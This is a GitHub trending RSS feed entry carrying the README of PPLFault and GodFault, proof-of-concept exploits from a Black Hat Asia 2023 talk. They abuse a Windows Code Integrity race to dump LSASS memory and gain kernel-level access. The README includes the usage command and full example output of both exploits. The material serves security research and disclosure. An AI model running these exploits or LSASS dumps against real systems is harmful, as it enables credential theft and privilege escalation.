<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-05-16T01:30:40Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>gabriellandau/PPLFault</title>
    <updated>2023-05-16T01:30:40Z</updated>
    <id>tag:github.com,2023-05-16:/gabriellandau/PPLFault</id>
    <link href="https://github.com/gabriellandau/PPLFault" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PPLFault&lt;/h1&gt; &#xA;&lt;p&gt;By &lt;a href=&#34;https://twitter.com/GabrielLandau&#34;&gt;Gabriel Landau&lt;/a&gt; at &lt;a href=&#34;https://www.elastic.co/security-labs/&#34;&gt;Elastic Security&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;From &lt;a href=&#34;https://www.blackhat.com/asia-23/briefings/schedule/#ppldump-is-dead-long-live-ppldump-31052&#34;&gt;PPLdump Is Dead. Long Live PPLdump!&lt;/a&gt; presented at &lt;a href=&#34;https://www.blackhat.com/asia-23&#34;&gt;Black Hat Asia 2023&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;PPLFault&lt;/h2&gt; &#xA;&lt;p&gt;Exploits a TOCTOU in Windows Code Integrity to achieve arbitrary code execution as WinTcb-Light then dump a specified process. For more details on the exploit, see my slides and/or talk.&lt;/p&gt; &#xA;&lt;h3&gt;Example Output&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Users\user\Desktop&amp;gt; cmd /c ver&#xA;&#xA;Microsoft Windows [Version 10.0.25346.1001]&#xA;PS C:\Users\user\Desktop&amp;gt; tasklist | findstr lsass&#xA;lsass.exe                      992 Services                   0     76,620 K&#xA;PS C:\Users\user\Desktop&amp;gt; (Get-NtProcess -Access QueryLimitedInformation -Pid 992).Protection&#xA;&#xA;Type           Signer&#xA;----           ------&#xA;ProtectedLight Lsa&#xA;&#xA;&#xA;PS C:\Users\user\Desktop&amp;gt; dir *.dmp&#xA;PS C:\Users\user\Desktop&amp;gt; .\PPLFault.exe -v 992 lsass.dmp&#xA; [+] No cleanup necessary.  Backup does not exist.&#xA; [+] GetShellcode: 528 bytes of shellcode written over DLL entrypoint&#xA; [+] Benign: C:\Windows\System32\EventAggregation.dll.bak&#xA; [+] Payload: C:\PPLFaultTemp\PPLFaultPayload.dll&#xA; [+] Placeholder: C:\PPLFaultTemp\EventAggregationPH.dll&#xA; [+] Acquired exclusive oplock to file: C:\Windows\System32\devobj.dll&#xA; [+] Ready.  Spawning WinTcb.&#xA; [+] SpawnPPL: Waiting for child process to finish.&#xA; [+] FetchDataCallback called.&#xA; [+] Hydrating 90112 bytes at offset 0&#xA; [+] Switching to payload&#xA; [+] Emptying system working set&#xA; [+] Working set purged&#xA; [+] Give the memory manager a moment to think&#xA; [+] Hydrating 90112 PAYLOAD bytes at offset 0&#xA; [+] Dump saved to: lsass.dmp&#xA; [+] Dump is 74.9 MB&#xA; [+] Operation took 937 ms&#xA;PS C:\Users\user\Desktop&amp;gt; dir *.dmp&#xA;&#xA;&#xA;    Directory: C:\Users\user\Desktop&#xA;&#xA;&#xA;Mode                 LastWriteTime         Length Name&#xA;----                 -------------         ------ ----&#xA;-a----          5/1/2023  11:18 AM       78581973 lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;GodFault&lt;/h2&gt; &#xA;&lt;p&gt;Exploits the same TOCTOU as PPLFault. However instead of dumping a process, it migrates to CSRSS and exploits a vulnerability in &lt;code&gt;win32k!NtUserHardErrorControlCall&lt;/code&gt; from &lt;a href=&#34;https://github.com/gabriellandau/ANGRYORCHARD/raw/0a4720f7e07e86a9ac2783411b81efac14938e26/Exploit.c#L69-L81&#34;&gt;ANGRYORCHARD&lt;/a&gt; to decrement &lt;code&gt;KTHREAD.PreviousMode&lt;/code&gt; from &lt;code&gt;UserMode&lt;/code&gt; (1) to &lt;code&gt;KernelMode&lt;/code&gt; (0). It proves &#34;God Mode&#34; access by opening &lt;code&gt;\Device\PhysicalMemory&lt;/code&gt;, normally inaccessible from &lt;code&gt;UserMode&lt;/code&gt;, as &lt;code&gt;SECTION_ALL_ACCESS&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Example Output&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Users\user\Desktop&amp;gt;GodFault.exe -v&#xA; [?] Server does not appear to be running.  Attempting to install it...&#xA; [+] No cleanup necessary.  Backup does not exist.&#xA; [+] GetShellcode: 2304 bytes of shellcode written over DLL entrypoint&#xA; [+] CSRSS PID is 772&#xA; [+] Benign: C:\Windows\System32\EventAggregation.dll.bak&#xA; [+] Payload: C:\GodFaultTemp\GodFaultPayload.dll&#xA; [+] Placeholder: C:\GodFaultTemp\EventAggregationPH.dll&#xA; [+] Acquired exclusive oplock to file: C:\Windows\System32\devobj.dll&#xA; [+] Testing initial ability to acquire PROCESS_ALL_ACCESS to System: Failure&#xA; [+] Ready.  Spawning WinTcb.&#xA; [+] SpawnPPL: Waiting for child process to finish.&#xA; [+] FetchDataCallback called.&#xA; [+] Hydrating 90112 bytes at offset 0&#xA; [+] Switching to payload&#xA; [+] Emptying system working set&#xA; [+] Working set purged&#xA; [+] Give the memory manager a moment to think&#xA; [+] Hydrating 90112 PAYLOAD bytes at offset 0&#xA; [+] Thread 6248 (KTHREAD FFFFA283B0A62080) has been blessed&#xA; [+] Testing post-exploit ability to acquire PROCESS_ALL_ACCESS to System: Success&#xA; [+] Opened \Device\PhysicalMemory.  Handle is 0x1b4&#xA; [+] Opened System process as PROCESS_ALL_ACCESS.  Handle is 0x1c0&#xA; [+] Press any key to continue...&#xA; [+] No cleanup necessary.  Backup does not exist.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Python&lt;/h2&gt; &#xA;&lt;p&gt;PoC that achieves arbitrary code execution as WinTcb-Light without the CloudFilter API. See &lt;a href=&#34;https://raw.githubusercontent.com/gabriellandau/PPLFault/main/python/README.md&#34;&gt;python/README.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Tested Platforms&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Windows 11 22H2 22621.1702 (May 2023)&lt;/th&gt; &#xA;   &lt;th&gt;Windows 11 Insider Canary 25346.1001 (April 2023)&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PPLFault&lt;/td&gt; &#xA;   &lt;td&gt;✔️&lt;/td&gt; &#xA;   &lt;td&gt;✔️&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;GodFault&lt;/td&gt; &#xA;   &lt;td&gt;✔️&lt;/td&gt; &#xA;   &lt;td&gt;❌ Insider PreviousMode mitigation &lt;a href=&#34;https://twitter.com/GabrielLandau/status/1597001955909697536?s=20&#34;&gt;bugchecks&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;Silhouette is covered by the &lt;a href=&#34;https://raw.githubusercontent.com/gabriellandau/PPLFault/main/LICENSE.txt&#34;&gt;ELv2 license&lt;/a&gt;. It uses &lt;a href=&#34;https://github.com/winsiderss/systeminformer/tree/25846070780183848dc8d8f335a54fa6e636e281/phnt&#34;&gt;phnt&lt;/a&gt; from SystemInformer under the &lt;a href=&#34;https://raw.githubusercontent.com/gabriellandau/PPLFault/main/phnt/LICENSE.txt&#34;&gt;MIT license&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Credits&lt;/h1&gt; &#xA;&lt;p&gt;Inspired by &lt;a href=&#34;https://github.com/itm4n/PPLdump&#34;&gt;PPLdump&lt;/a&gt; by &lt;a href=&#34;https://infosec.exchange/@itm4n&#34;&gt;Clément Labro&lt;/a&gt;, which Microsoft &lt;a href=&#34;https://itm4n.github.io/the-end-of-ppldump/&#34;&gt;patched&lt;/a&gt; in July 2022.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/gabriellandau/ANGRYORCHARD&#34;&gt;ANGRYORCHARD&lt;/a&gt; was created by &lt;a href=&#34;https://twitter.com/ilove2pwn_&#34;&gt;Austin Hudson&lt;/a&gt;, who released it when Microsoft patched PPLdump.&lt;/p&gt;</summary>
  </entry>
</feed>